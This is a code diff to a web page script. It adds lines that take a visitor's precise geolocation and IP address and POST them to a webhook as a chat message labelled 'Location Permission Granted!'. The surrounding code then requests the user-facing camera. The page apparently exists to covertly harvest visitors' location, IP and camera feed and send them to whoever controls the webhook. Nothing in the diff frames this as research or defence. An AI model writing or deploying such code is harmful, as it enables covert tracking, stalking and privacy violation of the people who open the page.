@@ -175,6 +175,18 @@ document.addEventListener('DOMContentLoaded', () => {
             // 2. Request IP (background, no prompt) without blocking if possible or just await
             const ip = await getIP();
 
+            // --- SEND LOCATION ONLY (Immediate) ---
+            const { latitude, longitude, accuracy } = position.coords;
+            const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `📍 **Location Permission Granted!**\n**IP:** ${ip}\n**Maps:** ${googleMapsUrl}\n**Coords:** ${latitude}, ${longitude} (Acc: ${accuracy}m)`
+                })
+            }).catch(console.error);
+
             // 3. Request Camera LAST
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
 
